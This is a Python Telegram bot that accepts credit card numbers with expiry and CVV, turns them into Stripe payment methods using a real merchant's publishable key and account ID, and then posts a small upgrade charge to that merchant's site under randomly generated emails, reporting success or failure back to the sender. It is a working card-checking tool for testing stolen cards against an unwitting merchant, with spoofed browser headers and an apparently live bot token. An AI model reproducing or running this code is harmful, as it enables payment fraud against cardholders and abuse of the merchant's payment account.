import telebot
import requests
import json
import random
import string
import time
import logging

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Replace with your actual Telegram Bot Token
BOT_TOKEN = "7018443911:AAGuZfbkaQc-s2icbMpljkjokKkzg_azkYI"
bot = telebot.TeleBot(BOT_TOKEN)

# Stripe API Keys (Keep these secure!)
STRIPE_PUBLIC_KEY = "pk_live_51IekcQKHPFAlBzyyGNBguT5BEI7NEBqrTxJhsYN1FI1lQb9iWxU5U2OXfi744NEMx5p7EDXh08YXrudrZkkG9bGc0ZCrkXrxL"
STRIPE_ACCOUNT = "acct_1OcwnhGahKpIA11x"

# Resident Urbanist Upgrade URL
UPGRADE_URL = "https://www.residenturbanist.com/upgrade?_data=routes%2Fupgrade"

# Headers (some are dynamic and will be set later)
BASE_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
    "Pragma": "no-cache",
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "en-US,en;q=0.9",
    "Baggage": "sentry-environment=production,sentry-release=5c1466075dd5d1e97ed55f5720bf5d83f1c6a4b2,sentry-public_key=35c3cc890abe9dbb51e6e513fcd6bbca,sentry-trace_id=c994fa1d2f624008856162f7a5fed09c,sentry-sample_rate=0.1,sentry-transaction=routes%2Fupgrade,sentry-sampled=false",
    "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
    "Origin": "https://www.residenturbanist.com",
    "Priority": "u=1, i",
    "Referer": "https://www.residenturbanist.com/upgrade",
    "Sec-Ch-Ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Microsoft Edge\";v=\"126\"",
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": "\"Windows\"",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Sentry-Trace": "c994fa1d2f624008856162f7a5fed09c-955b9d951224cad8-0",
}

# Cookies (Attempting to use a simplified cookie - you might need to adjust)
COOKIES = {
    "language": "en",
}

# Function to generate a random string
def generate_random_string(pattern):
    result = ''
    for char in pattern:
        if char == '?':
            result += random.choice(string.ascii_lowercase + string.ascii_uppercase)
        elif char == 'u':
            result += random.choice(string.ascii_uppercase)
        elif char == 'l':
            result += random.choice(string.ascii_lowercase)
        elif char == 'd':
            result += random.choice(string.digits)
        else:
            result += char
    return result

# Function to perform the GET_PM request
def get_payment_method(cc, cvv, mes, ano):
    url = "https://api.stripe.com/v1/payment_methods"
    payload = f"type=card&billing_details[email]=peshangdev%40gmail.com&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=42d8ff38-ab7e-4db6-9158-07c6aae1968bbe1b71&muid=b478162f-a900-4727-a7f7-63da0ad514c7124f66&sid=f74d0f5f-482d-4f12-916b-3652ddfcda000be806&pasted_fields=number&payment_user_agent=stripe.js%2Fd991d0758e%3B+stripe-js-v3%2Fd991d0758e%3B+card-element&referrer=https%3A%2F%2Fwww.residenturbanist.com&time_on_page=50023&key={STRIPE_PUBLIC_KEY}&_stripe_account={STRIPE_ACCOUNT}"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }
    try:
        response = requests.post(url, headers=headers, data=payload)
        response.raise_for_status()
        return response.json().get("id")
    except requests.exceptions.RequestException as e:
        logging.error(f"Error in GET_PM request: {e}")
        return None

# Function to perform the $5_UPGRADE request
def perform_upgrade(em_var, pm_var):
    url = UPGRADE_URL
    payload = f"email={em_var}%40gmail.com&force_three_d_secure=false&price_id=c5106d42-b50c-440e-8a4e-fafeb2691893&premium_offer_id=&last_resource_guid=&upgrade_error_message=Oops%2C+something+went+wrong.&upgrade_success_message=You+are+now+a+premium+subscriber&payment_method={pm_var}&email=peshangdev%40gmail.com&tax_id=&tax_id_type=&amount_cents=100"
    headers = BASE_HEADERS.copy()
    try:
        response = requests.post(url, headers=headers, data=payload, cookies=COOKIES)
        response.raise_for_status()
        logging.info(f"Upgrade Response JSON: {response.json()}")
        return response.json()
    except requests.exceptions.RequestException as e:
        logging.error(f"Error in $5_UPGRADE request: {e}")
        logging.error(f"Upgrade Response Text: {response.text}")
        return {"status": "error", "message": str(e)}
    except json.JSONDecodeError:
        logging.error(f"Error decoding JSON in $5_UPGRADE response. Text: {response.text}")
        return {"status": "error", "message": f"Failed to decode response: {response.text}"}

# Telegram Bot Handlers
@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome! Send me credit card details in the format: cc|mm|yy|cvv")

@bot.message_handler(func=lambda message: len(message.text.split('|')) == 4)
def process_card(message):
    try:
        cc, mm, yy, cvv = message.text.split('|')
        if len(yy) == 2:
            ano = f"20{yy}"
        elif len(yy) == 4:
            ano = yy
        else:
            bot.reply_to(message, "Invalid year format. Please use MM|YY or MM|YYYY.")
            return

        bot.reply_to(message, "Processing card...")
        em_var = generate_random_string("?u?l?l?l?l?l?l?l?l?l?d?d")
        pm_var = get_payment_method(cc, cvv, mm, ano)

        if pm_var:
            bot.reply_to(message, f"Payment Method ID obtained: {pm_var}. Now attempting upgrade...")
            upgrade_result = perform_upgrade(em_var, pm_var)
            time.sleep(5)  # Simulate 5-second delay

            if upgrade_result and upgrade_result.get("status") == "success":
                status_text = upgrade_result.get("status")
                message_text = upgrade_result.get("message", "Upgrade successful!")
                bot.reply_to(message, f"Upgrade Status: {status_text}\nMessage: {message_text}")
            elif upgrade_result and "error" in upgrade_result.get("status", "").lower():
                status_text = upgrade_result.get("status")
                message_text = upgrade_result.get("message", "Upgrade failed.")
                bot.reply_to(message, f"Upgrade Status: {status_text}\nMessage: {message_text}")
            else:
                bot.reply_to(message, f"Upgrade attempt failed or status could not be determined.\nRaw Response: {upgrade_result}")
        else:
            bot.reply_to(message, "Failed to obtain Payment Method ID. Card might be invalid.")

    except Exception as e:
        logging.error(f"Error processing card input: {e}")
        bot.reply_to(message, "Invalid input format. Please use: cc|mm|yy|cvv")

@bot.message_handler(func=lambda message: True)
def echo_all(message):
    bot.reply_to(message, "Send me credit card details in the format: cc|mm|yy|cvv")

if __name__ == '__main__':
    logging.info("Bot started...")
    bot.polling(none_stop=True)
